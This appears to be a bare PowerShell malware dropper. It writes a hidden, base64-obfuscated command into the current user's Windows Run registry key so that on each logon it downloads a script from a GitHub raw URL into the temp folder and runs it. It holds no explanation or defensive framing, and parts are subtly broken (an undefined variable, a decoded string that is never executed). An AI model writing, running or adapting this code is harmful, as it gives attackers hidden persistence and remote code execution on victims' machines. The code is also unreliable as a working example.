
$remoteScriptUrl = "https://github.com/dfgsgsdfgfd/1/raw/refs/heads/main/2"

$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regValue = "RemoteScript"

$obfuscatedCommand = "powershell.exe -WindowStyle Hidden -Command $commandBase64"

$command = "Start-Sleep -Seconds 30; Invoke-WebRequest -Uri '$remoteScriptUrl' -OutFile '$env:TEMP\script.ps1'; & '$env:TEMP\script.ps1'"
$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($command))

Set-ItemProperty -Path $regKey -Name $regValue -Value "powershell.exe -WindowStyle Hidden -Command [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('$encodedCommand'))"
